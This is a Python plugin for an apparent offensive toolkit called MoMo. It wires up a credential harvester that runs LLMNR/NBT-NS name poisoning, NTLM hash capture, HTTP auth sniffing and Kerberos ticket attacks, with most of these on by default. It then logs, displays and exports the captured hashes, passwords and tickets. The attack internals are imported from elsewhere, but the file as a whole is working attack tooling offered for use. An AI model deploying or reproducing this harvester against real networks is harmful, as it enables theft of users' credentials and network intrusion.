"""MoMo Credential Harvester Plugin.

Captures credentials via LLMNR/NBT-NS poisoning, NTLM capture,
HTTP auth sniffing, and Kerberos attacks.
"""

import asyncio
import logging
from typing import Optional, Any
from datetime import datetime

from momo.core.plugin import Plugin, PluginMetadata
from momo.infrastructure.creds import (
    CredsManager,
    CredsConfig,
    NTLMHash,
    CapturedCredential,
    PoisonedQuery,
    ServiceTicket,
)

logger = logging.getLogger(__name__)


class CredsHarvesterPlugin(Plugin):
    """Credential Harvesting Plugin for MoMo."""
    
    metadata = PluginMetadata(
        name="creds_harvester",
        version="1.0.0",
        description="Credential harvesting via Responder, NTLM, HTTP, Kerberos",
        author="MoMo Team",
        requires=["scapy", "ldap3"],
    )
    
    def __init__(self):
        super().__init__()
        self._manager: Optional[CredsManager] = None
        self._running = False
        self._last_cred_time: Optional[datetime] = None
    
    async def on_load(self, config: dict) -> None:
        """Initialize plugin with config."""
        # Build config from plugin settings
        creds_config = CredsConfig(
            interface=config.get('interface', 'eth0'),
            enable_responder=config.get('responder', {}).get('enabled', True),
            responder_llmnr=config.get('responder', {}).get('llmnr', True),
            responder_nbns=config.get('responder', {}).get('nbns', True),
            responder_mdns=config.get('responder', {}).get('mdns', False),
            enable_ntlm=config.get('ntlm', {}).get('enabled', True),
            ntlm_smb_port=config.get('ntlm', {}).get('smb_port', 445),
            ntlm_http_port=config.get('ntlm', {}).get('http_port', 80),
            enable_http_sniffer=config.get('http', {}).get('enabled', True),
            http_ports=config.get('http', {}).get('ports', [80, 8080]),
            enable_kerberos=config.get('kerberos', {}).get('enabled', False),
            dc_ip=config.get('kerberos', {}).get('dc_ip'),
            domain=config.get('kerberos', {}).get('domain'),
            kerberos_user=config.get('kerberos', {}).get('username'),
            kerberos_pass=config.get('kerberos', {}).get('password'),
            output_dir=config.get('output_dir', '/var/lib/momo/creds'),
            auto_export=config.get('auto_export', True),
        )
        
        self._manager = CredsManager(creds_config)
        self._manager.on_credential(self._on_credential)
        
        logger.info("CredsHarvester plugin loaded")
    
    async def on_start(self) -> None:
        """Start credential harvesting."""
        if self._manager:
            await self._manager.start()
            self._running = True
            logger.info("CredsHarvester started")
    
    async def on_stop(self) -> None:
        """Stop credential harvesting."""
        self._running = False
        if self._manager:
            await self._manager.stop()
            logger.info("CredsHarvester stopped")
    
    def _on_credential(self, cred_type: str, cred: Any) -> None:
        """Handle captured credential."""
        self._last_cred_time = datetime.now()
        
        # Format message based on type
        if cred_type == 'ntlm_hash':
            hash_obj: NTLMHash = cred
            msg = f"NTLM {hash_obj.version.name}: {hash_obj.domain}\\{hash_obj.username}"
        elif cred_type == 'http_cred':
            http_cred: CapturedCredential = cred
            msg = f"HTTP {http_cred.auth_type.name}: {http_cred.username}"
        elif cred_type == 'poisoned_query':
            query: PoisonedQuery = cred
            msg = f"Poisoned: {query.query_name} -> {query.source_ip}"
        elif cred_type == 'kerberos_ticket':
            ticket: ServiceTicket = cred
            msg = f"Kerberos: {ticket.spn}"
        else:
            msg = f"Credential: {cred_type}"
        
        logger.info(f"[CREDS] {msg}")
        
        # Publish event for OLED/Web
        self.publish_event('credential_captured', {
            'type': cred_type,
            'message': msg,
            'timestamp': datetime.now().isoformat(),
        })
    
    def get_status(self) -> dict:
        """Get plugin status for display."""
        if not self._manager:
            return {'running': False}
        
        stats = self._manager.stats
        return {
            'running': self._running,
            'uptime': stats['uptime'],
            'total': stats['total_credentials'],
            'ntlm': stats['ntlm_hashes'],
            'http': stats['http_credentials'],
            'poisoned': stats['poisoned_queries'],
            'kerberos': stats['kerberos_tickets'],
            'last_capture': self._last_cred_time.isoformat() if self._last_cred_time else None,
        }
    
    def get_credentials(self) -> list[dict]:
        """Get all captured credentials."""
        if self._manager:
            return self._manager.all_credentials
        return []
    
    def export_credentials(self, directory: str) -> dict:
        """Export credentials to directory."""
        if self._manager:
            return self._manager.export_all(directory)
        return {}
    
    # OLED display integration
    def get_oled_status_line(self) -> str:
        """Get status line for OLED display."""
        if not self._manager:
            return "CREDS: OFF"
        
        stats = self._manager.stats
        return f"CREDS: {stats['ntlm_hashes']}N {stats['http_credentials']}H"


# Plugin entry point
def create_plugin() -> Plugin:
    """Create plugin instance."""
    return CredsHarvesterPlugin()

